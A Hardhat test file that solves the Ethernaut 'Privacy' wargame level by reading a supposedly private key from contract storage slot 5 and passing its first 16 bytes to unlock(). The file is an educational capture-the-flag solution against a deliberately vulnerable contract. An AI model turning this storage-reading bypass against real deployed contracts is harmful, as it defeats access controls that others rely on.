import { loadFixture } from '@nomicfoundation/hardhat-network-helpers'
import { expect } from 'chai'
import { BigNumber, Contract, utils } from 'ethers'
import { hexValue, parseEther } from 'ethers/lib/utils'
import { ethers } from 'hardhat'

describe('Privacy', function () {
  const deployFixture = async () => {
    const [deployer, ...signers] = await ethers.getSigners()
    const PrivacyFactory = await ethers.getContractFactory('EthernautPrivacy')
    const passwords = ["Password", "is", "this"].map(p => ethers.utils.formatBytes32String(p))
    const Privacy = await PrivacyFactory.connect(deployer).deploy([
      utils.formatBytes32String("PASSWORD1"),
      utils.formatBytes32String("PASSWORD2"),
      utils.formatBytes32String("PASSWORD3")
    ])
    await Privacy.deployed()
    // const AttackFactory = await ethers.getContractFactory('EthernautPrivacyAttack')
    // const Attack = await AttackFactory.connect(signers[0]).deploy()
    // await Attack.deployed()
    return { Privacy, deployer, signers }
  }

  describe('Solution', function () {
    it('take ownership', async () => {
      const { Privacy, deployer, signers } = await loadFixture(deployFixture)
      expect(await Privacy.locked()).to.equal(true)


      // just showing values
      // const data = await Promise.all([3, 4, 5].map(async (n) => {
      //   return await ethers.provider.getStorageAt(Privacy.address, n)
      // }))
      // const keys = data.map(d => {
      //   console.log(ethers.utils.toUtf8String(d))
      // }).join("")

      // extract data[2] 
      const key = await ethers.provider.getStorageAt(Privacy.address, 5)
      // console.log(key)
      await Privacy.connect(signers[0]).unlock('0x' + key.substring(2, 34))
      expect(await Privacy.locked()).to.equal(false)

      // console.log(await ethers.provider.getStorageAt(Privacy.address, 5))
    })
  })
})
